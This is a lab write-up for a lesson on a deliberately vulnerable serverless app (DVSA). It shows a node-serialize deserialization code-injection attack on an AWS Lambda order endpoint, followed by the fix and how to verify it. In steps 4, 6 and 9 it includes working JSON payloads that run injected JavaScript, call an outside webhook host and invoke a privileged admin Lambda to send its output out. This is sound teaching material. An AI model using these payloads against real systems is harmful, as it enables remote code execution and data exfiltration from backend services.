# Lesson 3: Sensitive Information Disclosure (Code Injection)

## How to Use This Folder

1. Read this README from top to bottom.
2. Use the files in `payloads/` to copy clean request bodies for Postman.
3. Use the files in `snippets/` to document the vulnerable code pattern, the secure parsing fix, and optional `curl` reproduction commands.
4. Compare your results with the screenshots in `evidence/`.
5. Apply the fix in `DVSA-ORDER-MANAGER`, then repeat the verification step to confirm that injected code no longer executes.

> Do not commit real tokens, webhook IDs, or live credentials. Use placeholders in payload files and redact sensitive values in screenshots before pushing to GitHub.

---

## 1. Vulnerability Summary

This lesson demonstrates a **Sensitive Information Disclosure** vulnerability caused by unsafe deserialization in the DVSA order processing system.

By injecting malicious JavaScript into the `action` field of an API request, an attacker can execute arbitrary code inside the AWS Lambda function. This can cause:

- Remote code execution inside the Lambda runtime
- Unauthorized outbound HTTP requests from the backend
- Potential exposure of sensitive data stored in backend services such as Amazon S3

The affected component is the `DVSA-ORDER-MANAGER` Lambda function, reachable through the `POST /Stage/order` API Gateway endpoint. The root weakness is that user input is passed directly into `node-serialize`, which can reconstruct and execute embedded JavaScript functions.

---

## 2. Root Cause

The vulnerability exists because of three combined failures:

- **Unsafe deserialization** — the `node-serialize` library reconstructs JavaScript functions embedded in the `_$$ND_FUNC$$_` format.
- **No input validation** — the `action` field is accepted as-is without checking its type or content.
- **Weak backend protection** — privileged backend behavior can be influenced by user-controlled input.

### Why the attack works

The `node-serialize` library was designed to serialize objects that may include functions. When it finds the `_$$ND_FUNC$$_` marker, it treats the value as JavaScript code. If the function is invoked with `()`, the code runs during deserialization before normal application logic finishes.

Because this happens inside the Lambda execution environment, the injected code runs with the same runtime context and IAM permissions available to the function.

---

## 3. Environment

| Item | Value |
|---|---|
| Application | DVSA |
| AWS Region | `us-east-1` |
| API Endpoint | `POST https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order` |
| Lambda Function | `DVSA-ORDER-MANAGER` |
| CloudWatch Log Group | `/aws/lambda/DVSA-ORDER-MANAGER` |
| AWS Services | API Gateway, AWS Lambda, Amazon S3, CloudWatch Logs |
| Tools Used | Postman, Browser DevTools, webhook.site, AWS CloudWatch |

---

## 4. Prerequisites

Before starting:

1. Have access to the DVSA application with a valid user account.
2. Have Postman installed.
3. Open webhook.site and generate a unique listener URL.
4. Have access to CloudWatch Logs in the AWS Console.
5. Know your API Gateway endpoint for the order API.

Estimated time to reproduce: 10–15 minutes after the endpoint, token, and webhook URL are ready.

---

## 5. Step-by-Step Reproduction

### Step 1: Create a Normal Order

1. Open the DVSA application in your browser.
2. Add any product to the cart.
3. Proceed to checkout or perform an order-related action to generate a valid authenticated session.

---

### Step 2: Capture the API Request

1. Open Chrome DevTools (`F12`) → **Network** tab.
2. Perform an order-related request.
3. Find the `POST /Stage/order` request.
4. Copy:
   - The full API endpoint URL
   - The `Authorization` header value
   - The request body structure

Save the endpoint and token locally. Do not commit them to GitHub.

---

### Step 3: Test a Normal Request in Postman

First, verify that the endpoint is reachable before injecting anything.

**Method:** `POST`  
**URL:** `https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order`

**Headers:**

```text
Authorization: <your_token>
Content-Type: application/json
```

**Body:**

```json
{
  "action": "get_cart",
  "cart_id": "test"
}
```

The same request body is stored in:

```text
payloads/normal_get_cart_request.json
```

Confirm that the backend responds normally before continuing.

---

### Step 4: Send the Code Injection Payload

Go to webhook.site and copy your unique listener URL. Then send this payload in Postman:

```json
{
  "action": "_$$ND_FUNC$$_function(){require('http').get('http://<your-webhook-url>?test=hello')}()",
  "cart_id": "test"
}
```

The same payload template is stored in:

```text
payloads/rce_webhook_test_payload.json
```

Replace `<your-webhook-url>` with your real webhook.site URL before sending.

---

### Step 5: Observe Code Execution on Webhook

Switch to the webhook.site tab.

Expected result:

- An incoming `GET` request appears.
- The query string contains `test=hello`.
- The source location/IP indicates that the request came from AWS infrastructure.

This confirms that injected JavaScript executed inside the Lambda function and made a live outbound request.

**Evidence:**

![Step 5 - Webhook confirms RCE](evidence/step5_webhook_rce.png)

---

### Step 6: Attempt Privileged Backend Invocation

Next, send an advanced payload that tries to load `aws-sdk` and invoke a privileged Lambda function named `DVSA-ADMIN-GET-RECEIPT`.

```json
{
  "action": "_$$ND_FUNC$$_function(){var aws=require('aws-sdk');var lambda=new aws.Lambda();var p={FunctionName:'DVSA-ADMIN-GET-RECEIPT',InvocationType:'RequestResponse',Payload:JSON.stringify({'year':'2018','month':'12'})};lambda.invoke(p).promise().then(function(d){var h=require('http');h.get('http://<your-webhook-url>?data='+encodeURIComponent(JSON.stringify(d)));});}()",
  "cart_id": "test"
}
```

The same payload template is stored in:

```text
payloads/advanced_admin_receipt_payload.json
```

---

### Step 7: Observe the Backend Response

Expected result:

- API returns `502 Bad Gateway` or `500 Internal Server Error`.
- Response body shows a generic internal server error.

This does not mean the payload failed. It means the injected code reached the backend and attempted to execute privileged logic, but the runtime could not load the dependency.

**Evidence:**

![Step 7 - Postman shows 502 Bad Gateway](evidence/step7_postman_response.png)

---

### Step 8: Check CloudWatch Logs for Execution Proof

Go to:

```text
AWS Console → CloudWatch → Log Groups → /aws/lambda/DVSA-ORDER-MANAGER
```

Open the latest log stream and look for the `aws-sdk` error.

Expected evidence:

```text
Cannot find module 'aws-sdk'
```

The stack trace shows execution passing through `node-serialize`, proving that the injected code was evaluated inside the Lambda environment.

**Evidence:**

![Step 8 - CloudWatch shows Cannot find module aws-sdk](evidence/step8_aws_sdk_error.png)

---

### Step 9: Confirm Outbound Communication Attempt

In CloudWatch, check the earlier log entry related to `webhook.site`.

Expected evidence:

```text
ECONNRESET
host: webhook.site
```

This confirms that the Lambda function attempted an outbound network connection because of attacker-controlled input.

**Evidence:**

![Step 9 - CloudWatch shows ECONNRESET to webhook.site](evidence/step9_econnreset.png)

---

## 6. Attack Result Summary (Before Fix)

| What was attempted | Result |
|---|---|
| Outbound HTTP request to webhook.site | Succeeded — webhook received the request |
| Load `aws-sdk` and invoke admin Lambda | Failed because `aws-sdk` was unavailable in the runtime |
| Outbound communication from backend | Confirmed in CloudWatch |
| Code execution inside Lambda | Confirmed through webhook and CloudWatch evidence |

Full data exfiltration was limited by the runtime environment, but the attack surface is real because arbitrary code execution was confirmed.

---

## 7. Fix Strategy

The fix must be applied inside `DVSA-ORDER-MANAGER`:

- **Remove unsafe deserialization** — do not use `node-serialize` on user-controlled input.
- **Use `JSON.parse()`** — parse request bodies as data only.
- **Validate input types** — reject requests where `action` is missing or not a string.
- **Reject function payload markers** — block values containing `_$$ND_FUNC$$_`.
- **Protect privileged actions** — sensitive backend functions must require explicit authorization.
- **Apply least privilege** — the Lambda role should only have the permissions required for normal order handling.

---

## 8. Code / Config Changes

**Location:** `DVSA-ORDER-MANAGER` Lambda function input handling logic.

### Before: vulnerable deserialization

```javascript
const serialize = require('node-serialize');
let obj = serialize.unserialize(userInput);
```

This vulnerable snippet is stored in:

```text
snippets/vulnerable_deserialization_snippet.js
```

### After: safe parsing and validation

```javascript
let obj = JSON.parse(userInput);

if (typeof obj.action !== "string" || obj.action.includes("_$$ND_FUNC$$_")) {
    throw new Error("Invalid input");
}
```

A more complete safe validation example is stored in:

```text
snippets/safe_parsing_validation_snippet.js
```

### Summary of changes

- Removed `node-serialize` from the request parsing path.
- Replaced unsafe deserialization with `JSON.parse()`.
- Added type validation for the `action` field.
- Added rejection for function payload markers.
- Treated privileged backend actions as authorization-protected operations.

---

## 9. Verification After Fix

After applying the fix, send the same webhook payload again:

```json
{
  "action": "_$$ND_FUNC$$_function(){require('http').get('http://<your-webhook-url>?test=hello')}()",
  "cart_id": "test"
}
```

Expected result after fix:

- No incoming request appears on webhook.site.
- No injected execution appears in CloudWatch.
- The API returns a safe error response or rejects the request.
- Normal order requests continue to work correctly.

The important change is that the payload is now treated as data, not executable code.

---

## 10. Security Analysis

### Intended Logic

Under normal conditions, a user submits an order through the frontend. The expected flow is:

```text
Browser → API Gateway → Lambda (DVSA-ORDER-MANAGER) → DynamoDB / S3
                                                      → CloudWatch Logs
```

Security rules the system must enforce:

- User input must never be executed as code.
- No privileged backend function should be triggered by untrusted input alone.
- No external requests should be initiated because of attacker-controlled request content.

---

### Table 1 — Intended vs. Observed Behavior

| Vulnerability | Intended Rule(s) | Artifacts Used | Normal Behavior Evidence | Exploit Behavior Evidence |
|---|---|---|---|---|
| Sensitive Information Disclosure / Code Injection | Input must not be executed as code. Backend actions must be controlled by trusted application logic only. | Postman request, webhook.site request, CloudWatch logs, Lambda error stack traces | Normal request is processed without external calls or code execution | Injected payload triggered outbound request to webhook.site and CloudWatch confirmed execution through `node-serialize` |

---

### Table 2 — Deviation Analysis and Fix

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied | Post-Fix Verification | Latency |
|---|---|---|---|---|---|
| Sensitive Information Disclosure / Code Injection | The system executed user-supplied input as JavaScript code inside the Lambda runtime, violating the rule that input must be treated strictly as data. | Intentional Misuse / Security-Relevant Abuse | Removed `node-serialize`, replaced it with `JSON.parse()`, added input validation, and protected privileged operations | Same payload no longer executes, no webhook request is received, and no injected execution appears in CloudWatch | Not measured |

---

## 11. Lessons Learned

The core mistake was using a library that can reconstruct executable JavaScript functions from user-controlled input. `node-serialize` should never be used to parse untrusted API request bodies.

In serverless environments, this type of issue is especially dangerous because the Lambda function is directly reachable through API Gateway and runs with an IAM execution role. A single code execution bug can become a wider cloud security problem if the function role has access to S3, DynamoDB, or other Lambda functions.

The main lesson is simple: user input must always be treated as data, never executable code. Safe parsing, strict validation, protected privileged operations, and least-privilege IAM all reduce the chance that a small input-handling bug becomes a full backend compromise.

---

## Repository Structure

```text
lesson3_sensitive_information_disclosure/
│
├── README.md
├── evidence/
│   ├── step5_webhook_rce.png
│   ├── step7_postman_response.png
│   ├── step8_aws_sdk_error.png
│   └── step9_econnreset.png
├── payloads/
│   ├── advanced_admin_receipt_payload.json
│   ├── normal_get_cart_request.json
│   ├── postman_headers_template.txt
│   └── rce_webhook_test_payload.json
└── snippets/
    ├── curl_reproduction_template.sh
    ├── safe_parsing_validation_snippet.js
    └── vulnerable_deserialization_snippet.js
```
